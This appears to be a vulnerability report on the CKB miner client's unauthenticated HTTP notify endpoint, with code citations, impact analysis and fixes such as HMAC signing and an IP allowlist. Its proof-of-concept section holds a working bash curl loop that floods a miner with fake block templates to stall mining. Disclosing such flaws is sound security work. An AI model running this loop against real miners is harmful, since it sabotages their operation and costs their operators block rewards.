### Title
Unauthenticated miner notify HTTP endpoint allows any network actor to inject fake block templates, causing sustained mining disruption — (File: `miner/src/client.rs`)

---

### Summary

The CKB miner client's notify mode opens a plain HTTP server that accepts block templates from **any source without authentication or origin validation**. An unprivileged network actor who can reach the miner's configured `listen` address can continuously POST crafted `BlockTemplate` payloads, causing the miner to abandon valid PoW work and mine on attacker-controlled templates indefinitely.

---

### Finding Description

**Shared global counter — `work_id`**

`BlockAssembler` maintains a node-wide `work_id: Arc<AtomicU64>` counter that is incremented (`fetch_add(1, Ordering::SeqCst)`) on every template update — `update_full`, `update_blank`, `update_uncles`, `update_proposals`, and `update_transactions`. [1](#0-0) [2](#0-1) 

**Miner client reads and caches the `work_id`**

The miner client stores the last-seen `work_id` in `current_work_id: Arc<AtomicU64>` and calls `update_block_template` whenever a new template arrives (either via polling or via the notify push). It dispatches new work to workers only when the incoming `work_id` differs from the cached value. [3](#0-2) [4](#0-3) 

**Unauthenticated HTTP notify endpoint**

When `listen` is configured, the miner spawns an HTTP server. The request handler deserialises any incoming body as a `BlockTemplate` and immediately calls `update_block_template` — with **no authentication, no HMAC, no IP allowlist, and no signature check**: [5](#0-4) 

The `listen` field is a plain `Option<SocketAddr>` with no documented security constraint: [6](#0-5) 

The official config template shows the feature as a first-class option: [7](#0-6) 

**Attack mechanism**

`update_block_template` accepts the incoming template whenever `incoming_work_id != current_work_id || current_work_id == 0`. An attacker who can reach the listen port simply sends successive HTTP POSTs with monotonically increasing `work_id` values and a syntactically valid (but consensus-invalid or attacker-controlled) `BlockTemplate`. Each POST:

1. Passes the `work_id` check (new value differs from current).
2. Atomically updates `current_work_id`.
3. Sends `Works::New(work)` to the worker channel.

The `Miner::notify_new_work` path then stops workers and restarts them on the fake template, provided the fake `parent_hash` is not already in `legacy_work`: [8](#0-7) 

Because `legacy_work` is keyed on `parent_hash` and the attacker controls the template, they can rotate `parent_hash` values to bypass this cache indefinitely.

**No server-side `work_id` enforcement**

`submit_block` on the node side logs `work_id` but never validates it against the current template, so the miner cannot detect the injection by observing submission failures: [9](#0-8) 

---

### Impact Explanation

- **Mining availability**: The miner never completes valid PoW because workers are continuously redirected to attacker-controlled templates. Block rewards are lost for the duration of the attack.
- **Service degradation**: Each injected template causes a `WorkerMessage::Stop` followed by `WorkerMessage::NewWork`, burning CPU cycles and resetting nonce search state.
- **Griefing**: The attacker's cost is bounded by the rate of HTTP requests — no PoW, no stake, no privileged access required. A single attacker on the same LAN or with any route to the listen port can sustain the disruption indefinitely.

---

### Likelihood Explanation

The `listen` option is a documented, supported production feature. Operators who deploy the miner on a host with a reachable network interface (cloud VM, co-located mining farm, pool proxy) and configure `listen` to anything other than `127.0.0.1` expose the endpoint to any network peer. There is no warning in the config template or documentation about the absence of authentication. The attack requires only the ability to send HTTP POST requests to the configured address — no credentials, no chain state, no PoW.

---

### Recommendation

1. **Authenticate notify pushes**: Add a shared secret (HMAC-SHA256 over the body, or a bearer token) to the notify endpoint. The CKB node should sign outgoing pushes; the miner should reject unsigned ones.
2. **IP allowlist**: Restrict accepted connections to the configured `rpc_url` host.
3. **Documentation**: Explicitly warn that binding `listen` to any address other than `127.0.0.1` without a firewall rule exposes an unauthenticated control plane to the network.

---

### Proof of Concept

```bash
# Miner configured with: listen = "0.0.0.0:8888"
# Attacker on the same network:

FAKE_TEMPLATE='{"version":"0x0","compact_target":"0x1e083126","current_time":"0x174c45e17a3",
  "number":"0x401","epoch":"0x7080019000001",
  "parent_hash":"0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
  "cycles_limit":"0xd09dc300","bytes_limit":"0x91c08","uncles_count_limit":"0x2",
  "uncles":[],"transactions":[],"proposals":[],
  "cellbase":{"cycles":null,"data":{"cell_deps":[],"header_deps":[],"inputs":[{"previous_output":{"index":"0xffffffff","tx_hash":"0x0000000000000000000000000000000000000000000000000000000000000000"},"since":"0x401"}],"outputs":[],"outputs_data":[],"version":"0x0","witnesses":[]},"hash":"0x0000000000000000000000000000000000000000000000000000000000000001"},
  "work_id":"0x%x",
  "dao":"0xd495a106684401001e47c0ae1d5930009449d26e32380000000721efd0030000"}'

for i in $(seq 1 99999); do
  curl -s -X POST http://<miner-ip>:8888/ \
    -H 'content-type: application/json' \
    -d "$(printf "$FAKE_TEMPLATE" $i)"
  sleep 0.1   # 10 injections/sec; miner never finishes a nonce search
done
```

Each iteration causes the miner to call `WorkerMessage::Stop` then `WorkerMessage::NewWork` on the fake template, resetting all worker threads. The miner produces no valid blocks for the duration of the attack. [10](#0-9) [11](#0-10)

### Citations

**File:** tx-pool/src/block_assembler/mod.rs (L103-108)
```rust
pub struct BlockAssembler {
    pub(crate) config: Arc<BlockAssemblerConfig>,
    pub(crate) work_id: Arc<AtomicU64>,
    pub(crate) candidate_uncles: Arc<Mutex<CandidateUncles>>,
    pub(crate) current: Arc<Mutex<CurrentTemplate>>,
    pub(crate) poster: Arc<Client<HttpConnector, Full<bytes::Bytes>>>,
```

**File:** tx-pool/src/block_assembler/mod.rs (L243-252)
```rust
        let mut builder = BlockTemplateBuilder::from_template(&current.template);
        builder
            .set_proposals(Vec::from_iter(proposals))
            .set_transactions(checked_txs)
            .work_id(self.work_id.fetch_add(1, Ordering::SeqCst))
            .current_time(cmp::max(
                unix_time_as_millis(),
                current.template.current_time,
            ))
            .dao(dao);
```

**File:** miner/src/client.rs (L145-155)
```rust
pub struct Client {
    /// Current work ID being processed.
    pub current_work_id: Arc<AtomicU64>,
    /// Channel sender for new work notifications.
    pub new_work_tx: Sender<Works>,
    /// Miner client configuration.
    pub config: MinerClientConfig,
    /// RPC client for communicating with the CKB node.
    pub rpc: Rpc,
    handle: Handle,
}
```

**File:** miner/src/client.rs (L234-270)
```rust
    async fn listen_block_template_notify(&self, addr: SocketAddr) {
        let listener = TcpListener::bind(addr).await.unwrap();
        let server = auto::Builder::new(TokioExecutor::new());
        let graceful = GracefulShutdown::new();
        let stop_rx: CancellationToken = new_tokio_exit_rx();

        loop {
            let client = self.clone();
            let handle = service_fn(move |req| handle(client.clone(), req));
            tokio::select! {
                conn = listener.accept() => {
                    let (stream, _) = match conn {
                        Ok(conn) => conn,
                        Err(e) => {
                            info!("accept error: {}", e);
                            tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                            continue;
                        }
                    };
                    let stream = hyper_util::rt::TokioIo::new(Box::pin(stream));
                    let conn = server.serve_connection_with_upgrades(stream, handle);

                    let conn = graceful.watch(conn.into_owned());
                    tokio::spawn(async move {
                        if let Err(err) = conn.await {
                            info!("connection error: {}", err);
                        }
                    });
                },
                _ = stop_rx.cancelled() => {
                    info!("Miner client received exit signal. Exit now");
                    break;
                }
            }
        }
        drop(listener);
        graceful.shutdown().await;
```

**File:** miner/src/client.rs (L293-312)
```rust
    fn update_block_template(&self, block_template: BlockTemplate) {
        let work_id = block_template.work_id.into();
        let updated = |id| {
            if id != work_id || id == 0 {
                Some(work_id)
            } else {
                None
            }
        };
        if self
            .current_work_id
            .fetch_update(Ordering::SeqCst, Ordering::SeqCst, updated)
            .is_ok()
        {
            let work: Work = block_template.into();
            if let Err(e) = self.new_work_tx.send(Works::New(work)) {
                error!("notify_new_block error: {:?}", e);
            }
        }
    }
```

**File:** miner/src/client.rs (L358-369)
```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }

    Ok(Response::new(Empty::new()))
}
```

**File:** util/app-config/src/configs/miner.rs (L28-30)
```rust
    /// listen block_template notify instead of loop poll
    pub listen: Option<SocketAddr>,
}
```

**File:** resource/ckb.toml (L270-273)
```text
# # Block assembler will notify new block template through http post to specified endpoints when update
# notify = ["http://127.0.0.1:8888"]
# # Execute command when the block template changes, first arg is block template.
# notify_scripts = ["your_notify_scripts.sh"]
```

**File:** miner/src/miner.rs (L127-138)
```rust
    fn notify_new_work(&mut self, work: Work) {
        let parent_hash = work.block.header().into_view().parent_hash();
        if !self.legacy_work.contains(&parent_hash) {
            let pow_hash = work.block.header().calc_pow_hash();
            let (target, _) = compact_to_target(work.block.header().raw().compact_target().into());
            self.notify_workers(WorkerMessage::NewWork {
                pow_hash,
                work,
                target,
            });
        }
    }
```

**File:** miner/src/miner.rs (L140-188)
```rust
    fn submit_nonce(&mut self, pow_hash: Byte32, work: Work, nonce: u128) {
        self.notify_workers(WorkerMessage::Stop);
        let raw_header = work.block.header().raw();
        let header = Header::new_builder().raw(raw_header).nonce(nonce).build();
        let block = work
            .block
            .as_advanced_builder()
            .header(header.into_view())
            .build();
        let block_hash = block.hash();
        let parent_hash = block.parent_hash();

        if self.legacy_work.contains(&parent_hash) {
            debug!(
                "uncle {} pow_hash: {:#x}, header: {}",
                block.number(),
                pow_hash,
                block.header()
            );
            self.notify_workers(WorkerMessage::Start);
            return;
        } else {
            debug!(
                "block {} pow_hash: {:#x}, header: {}",
                block.number(),
                pow_hash,
                block.header()
            );
        }

        self.legacy_work.put(parent_hash, ());
        if self.stderr_is_tty {
            debug!("Found! #{} {:#x}", block.number(), block_hash);
        } else {
            info!("Found! #{} {:#x}", block.number(), block_hash);
        }

        // submit block and poll new work
        {
            if let Err(e) = self
                .client
                .submit_block(&work.work_id.to_string(), block.data())
            {
                self.legacy_work.pop(&block.parent_hash());
                error!("rpc call submit_block error: {:?}", e);
            }
            self.client.blocking_fetch_block_template();
            self.notify_workers(WorkerMessage::Start);
        }
```

**File:** rpc/src/module/miner.rs (L260-298)
```rust
    fn submit_block(&self, work_id: String, block: Block) -> Result<H256> {
        let block: packed::Block = block.into();
        let block: Arc<core::BlockView> = Arc::new(block.into_view());
        let header = block.header();
        debug!(
            "start to submit block, work_id = {}, block = #{}({})",
            work_id,
            block.number(),
            block.hash()
        );

        let snapshot: &Snapshot = &self.shared.snapshot();
        let consensus = snapshot.consensus();

        // Verify header
        HeaderVerifier::new(snapshot, consensus)
            .verify(&header)
            .map_err(|err| handle_submit_error(&work_id, &err))?;
        if self
            .shared
            .snapshot()
            .get_block_header(&block.parent_hash())
            .is_none()
        {
            let err = format!(
                "Block parent {} of {}-{} not found",
                block.parent_hash(),
                block.number(),
                block.hash()
            );

            return Err(handle_submit_error(&work_id, &err));
        }

        // Verify and insert block
        let is_new = self
            .chain
            .blocking_process_block(Arc::clone(&block))
            .map_err(|err| handle_submit_error(&work_id, &err))?;
```
